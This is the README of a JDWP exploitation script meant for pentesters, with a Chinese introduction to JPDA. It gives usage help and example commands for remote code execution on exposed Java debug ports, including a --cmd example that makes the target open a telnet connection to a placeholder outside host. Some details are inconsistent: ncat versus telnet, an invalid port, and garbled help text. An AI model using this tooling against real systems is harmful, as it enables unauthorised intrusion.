
简要描述：
JPDA(Java Platform Debugger Architecture) 是 Java 平台调试体系结构的缩写，通过 JPDA 提供的 API，开发人员可以方便灵活的搭建 Java 调试应用程序。JPDA 主要由三个部分组成：Java虚拟机工具接口（JVMTI），Java 调试线协议（JDWP），以及 Java 调试接口（JDI）

## What is it ?
This exploitation script is meant to be used by pentesters against active JDWP service, in order to gain Remote Code Execution.


## How does it work ?
Well, in a pretty standard way, the script only requires a Python 2 interpreter:

	% python jdwp.py -h
	usage: jdwp.py [-h] -t IP [-p PORT] [--cmd COMMAND]
	

    Universal exploitation script for JDWP by 老夫开车怕过谁
    optional arguments:
    -h, --help            show this help message and exit
    -t IP, --target IP    Remote target IP (default: None)
    -p PORT, --port PORT  Remote target port (default: 8000)
    --break-on JAVA_METHOD
    Specify full path to method to break on (default:
    	java.net.ServerSocket.accept)
    	--cmd COMMAND         Specify full path to method to break on (default:
    		None)

To target a specific host/port:

	$ python jdwp.py -t my.target.ip -p 1234
	
This command will only inject Java code on the JVM and show some info like Operating System, Java version. Since it does not execute external code/binary, it is totally safe and can be used as Proof-Of-Concept

	$ python jdwp.py -t 100.100.100.100 -p 8001 --cmd "telnet x.x.x.x 66666"
	
This command will actually execute the process `ncat` with the specified argument with the rights given to the running JVM.

Before sending questions, make sure to read http://blog.ioactive.com/2014/04/hacking-java-debug-wire-protocol-or-how.html for full understanding of the JDWP protocol. 







